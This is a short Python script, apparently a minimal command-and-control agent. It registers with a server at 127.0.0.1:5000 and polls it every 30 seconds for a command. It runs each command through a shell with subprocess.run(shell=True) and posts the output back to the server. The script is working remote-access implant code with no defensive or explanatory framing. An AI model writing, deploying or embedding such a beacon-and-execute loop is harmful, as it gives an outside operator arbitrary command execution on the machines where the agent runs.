import requests
import time
import subprocess


def register():
    print("Agent started\n")
    print("Registering Agent ... \n")
    response = requests.get(url="http://127.0.0.1:5000/agent/register")
    uuid = response.text
    print("Agent registered with: " + uuid)
    return uuid


uuid = register()


def get_commands():
    command = requests.get(url="http://127.0.0.1:5000/agent/" + uuid + "/command")
    return command.text


while True:
    time.sleep(30)
    cmd = get_commands()

    if cmd == "No command set":
        continue

    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    requests.post(url=f"http://127.0.0.1:5000/agent/{uuid}/output", data=result.stdout + result.stderr, headers={"Content-Type": "text/plain"})

